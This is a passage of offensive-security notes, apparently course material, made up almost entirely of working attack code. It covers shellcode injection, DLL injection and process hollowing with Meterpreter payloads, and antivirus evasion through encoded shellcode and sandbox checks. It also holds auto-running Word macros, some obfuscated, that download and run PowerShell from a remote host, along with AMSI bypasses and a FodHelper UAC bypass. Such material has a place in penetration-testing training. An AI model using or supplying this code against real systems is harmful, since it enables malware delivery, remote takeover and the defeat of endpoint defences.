    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$id = (Start-Process Notepad -passthru).ID

$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [Bool], [Int]) ([IntPtr]))).Invoke(0x001F0FFF, $false, $id)
        
$addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...
     
$outSize = 0
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int32], [Int].MakeByRefType()) ([Bool]))).Invoke($hProcess, $addr, $buf, $buf.length, [ref] $outSize)
#[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int32], [Int].MakeByRefType()) ([Bool]))).Invoke($hProcess, $addr, $buf, $buf.length, [ref] 0)
       
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
```

## DLL Injection with C#

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o met.dll
```

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace DLLInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o met.dll
            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\met.dll";

            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.45.179/met.dll", dllName);

            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;

            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }
    }
}
```

## Reflective DLL Injection in PowerShell

```pwsh
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.179/met.dll')
$procid = (Get-Process -Name explorer).Id
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

```pwsh
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.179/met.dll')
$procid = (Get-Process -Name explorer).Id
IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.45.179/Invoke-ReflectivePEInjection.ps1'))
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

## Process Hollowing in C#
```csharp
using System;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}
```

# Antivirus Evasion

```pwsh
$bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
$bytes[18867] = 0
[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
```

## Bypassing Antivirus with Metasploit
```bash
msfvenom --list encoders
msfvenom --list encrypt
```

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x86/shikata_ga_nai -f exe -o met.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x64/zutto_dekiru -f exe -o met64_zutto.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.176.134 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o met64_notepad.exe
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o met64_aes.exe
```

## Bypassing Antivirus with C#

### Encrypt the shellcode
```csharp
using System;
using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp 
            byte[] buf = new byte[695] { ... };

            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
                // encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}

```

```csharp
using System;
using System.Runtime.InteropServices;

namespace BypassingAntivirus
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            IntPtr flsindex = FlsAlloc(IntPtr.Zero);
            if (flsindex == null)
            {
                return;
            }

            byte[] buf = new byte[695] { <encrypted shellcode> };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
                // buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

## Bypassing Antivirus in VBA

### Encrypt the shellcode
```csharp
using System;
using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            // msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp 
            byte[] buf = new byte[695] { };

            byte[] encoded = new byte[buf.Length];

            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
                // encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            uint counter = 0;

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if (counter % 50 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }
            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
```

```VB
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 2 Then
        Exit Function
    End If

    buf = Array(<encrypted shellcode>)

    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 2
    Next i

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

## Stomping On Microsoft Word
### fakecode.vba
```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    MsgBox ("This is a macro test")
End Sub
```

Automate the VBA Stomping process with Evil Clippy tool
```bat
EvilClippy.exe -s fakecode.vba Doc1.doc
```

## Hiding PowerShell Inside VBA

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim strArg As String
    strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
    Shell strArg, vbHide
End Sub
```

### Dechaining with WMI
PowerShell is running as a 64-bit process, => must update the PowerShell shellcode runner script accordingly
```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub
```

### Obfuscating VBA
```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim strArg As String
    strArg = StrReverse("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")

    GetObject(StrReverse(":stmgmniw")).Get(StrReverse("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub
```

Reduce the number of times StrReverse appears in our code
```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Function bears(cows)
    bears = StrReverse(cows)
End Function

Sub MyMacro()
    Dim strArg As String
    strArg = bears("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")

    GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub
```

Perform a more complex obfuscation by converting the ASCII string to its decimal representation and then performing a Caesar cipher encryption on the result

```pwsh
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip
```

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim Apples As String
    Dim Water As String
    
    Apples = "<clipboard>"
    Water = Nuts(Apples)
    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function
```

When most antivirus products emulate the execution of a document, they rename it. During execution, we check the name of the document and if we find that it is not the same as the one we originally provided, we can assume the execution has been emulated and we can exit the code

Generates a Meterpreter reverse shell as long as our file is named runner.doc
```VB
If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
    Exit Function
End If
```

## Bypassing AMSI With Reflection in PowerShell
```pwsh
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

```pwsh
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true)
```

## Wrecking AMSI in PowerShell
```pwsh
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
```

## FodHelper UAC Bypass

### run4.txt
```pwsh
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;set EnableStageEncoding true;set StageEncoder encoder/x64/zutto_dekiru;run;"
```

```pwsh
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run4.txt') | IEX" –Force

New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

C:\Windows\System32\fodhelper.exe
```

### Metasploit UAC bypass module
```
use exploit/windows/local/bypassuac_fodhelper
show targets
set target 1
sessions -l
set session 1
set payload windows/x64/meterpreter/reverse_https
set lhost 192.168.119.120
set lport 444
exploit
```

## Bypassing AMSI in JScript
### Registry Key
Prepend below code to the DotNetToJscript-generated shellcode runner to bypass AMSI and generate a reverse shell.
```js
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try{
	var AmsiEnable = sh.RegRead(key);
	if(AmsiEnable!=0){
	throw new Error(1, '');
	}
}catch(e){
	sh.RegWrite(key, 0, "REG_DWORD");
	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
	sh.RegWrite(key, 1, "REG_DWORD");
	WScript.Quit(1);
}
```

### Rename wscript.exe to amsi.dll and executing it.
Prepend below code to the DotNetToJscript-generated shellcode runner 
```js
var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try
{
	if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
	{
		throw new Error(1, '');
	}
}
catch(e)
{
	filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
	sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
	WScript.Quit(1);
}
```